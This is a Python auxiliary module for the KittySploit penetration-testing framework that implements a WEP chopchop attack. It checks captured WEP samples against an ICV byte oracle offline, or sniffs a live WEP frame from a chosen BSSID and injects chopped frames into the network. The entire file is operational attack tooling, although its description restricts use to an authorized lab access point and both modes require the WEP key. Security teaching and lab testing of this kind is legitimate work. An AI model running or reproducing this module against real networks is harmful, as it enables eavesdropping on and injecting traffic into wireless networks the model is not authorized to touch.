#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WEP chopchop lab tool (local ICV oracle + optional online inject)."""

from __future__ import annotations
from pathlib import Path
from kittysploit import *
from lib.protocols.wlan.wep import parse_wep_data
from lib.protocols.wlan.wep_chopchop import build_chop_inject_frame, peel_plaintext_local, try_chop_guess
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WEP ChopChop Lab",
        "description": (
            "WEP byte oracle: offline ICV checks with a candidate key, or sniff one "
            "frame then inject chopped variants (authorized WEP lab AP only)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "wep", "chopchop"],
        "references": ["https://attack.mitre.org/techniques/T1040/"],
    }

    mode = OptEnum(["local", "online"], "local", "local=ICV verify; online=sniff+inject", required=False)
    iv_json = OptFile("", "IV JSON from wep_iv_collect (local mode)", required=False)
    wep_key = OptString("", "WEP key (5/13 bytes or hex)", required=False)
    bssid = OptString("", "Filter BSSID (online)", required=False)
    sniff_time = OptInteger(15, "Online capture window", required=False)
    inject_chops = OptInteger(3, "Online chopped frames to inject", required=False)

    def check(self):
        mode = str(self.mode or "local").lower()
        if mode == "local":
            if not Path(str(self.iv_json or "")).is_file():
                print_error("IV_JSON required for local mode")
                return False
            if not str(self.wep_key or "").strip():
                print_error("WEP_KEY required for local mode")
                return False
            return True
        return self.wlan_check_iface()

    def _parse_key(self) -> bytes | None:
        key_raw = str(self.wep_key or "").strip()
        key = key_raw.encode("latin-1")
        if len(key) == 10 and all(c in "0123456789abcdefABCDEF" for c in key_raw):
            key = bytes.fromhex(key_raw)
        if len(key) not in (5, 13):
            print_error("WEP key must be 5 or 13 bytes")
            return None
        return key

    def run(self):
        mode = str(self.mode or "local").lower()
        if mode == "local":
            key = self._parse_key()
            if not key:
                return False
            store = self.wlan_wep_load_json(str(self.iv_json))
            if not store.samples:
                print_error("No IV samples")
                return False
            sample = store.samples[0]
            plain = peel_plaintext_local(sample, key)
            if not plain:
                print_error("Key does not validate ICV on sample")
                return False
            print_success(f"Plaintext length {len(plain)} bytes")
            pos = len(sample.ciphertext) - 5
            hits = sum(1 for g in range(256) if try_chop_guess(sample, key, pos, g))
            print_info(f"Chop byte oracle at pos {pos}: {hits}/256 ICV-valid guesses")
            frame = build_chop_inject_frame(sample, key, chop_index=max(1, len(plain) - 1))
            if frame:
                print_success("Built chopped inject frame (online-ready)")
            return plain is not None

        filt = str(self.bssid or "").strip().lower()
        dwell = max(5, int(self.sniff_time or 15))
        sample_raw = None

        def on_cap(raw: bytes, _rssi: int | None) -> None:
            nonlocal sample_raw
            from lib.protocols.wlan.wep import parse_wep_data

            s = parse_wep_data(raw)
            if not s or sample_raw is not None:
                return
            if filt and s.bssid.lower() != filt:
                return
            sample_raw = raw

        print_status(f"Sniffing WEP frame ({dwell}s)...")
        try:
            self.wlan_sniff(on_cap, timeout=float(dwell))
        except (PermissionError, OSError) as exc:
            print_error(str(exc))
            return False
        if not sample_raw:
            print_warning("No WEP frame captured")
            return False

        key = self._parse_key()
        if not key:
            print_warning("Set WEP_KEY for inject path — frame captured only")
            return False

        sample = parse_wep_data(sample_raw)
        if not sample:
            return False
        plain = peel_plaintext_local(sample, key)
        if not plain:
            print_error("WEP_KEY does not decrypt captured frame")
            return False

        chops = max(1, int(self.inject_chops or 3))
        sent = 0
        for idx in range(chops, 0, -1):
            frame = build_chop_inject_frame(sample, key, chop_index=idx)
            if not frame:
                continue
            try:
                sent += self.wlan_inject_raw([frame], count=2)
            except (PermissionError, OSError) as exc:
                print_warning(f"Inject: {exc}")
                break
        print_success(f"Injected {sent} chopped frame(s); ICV oracle validated locally")
        return sent > 0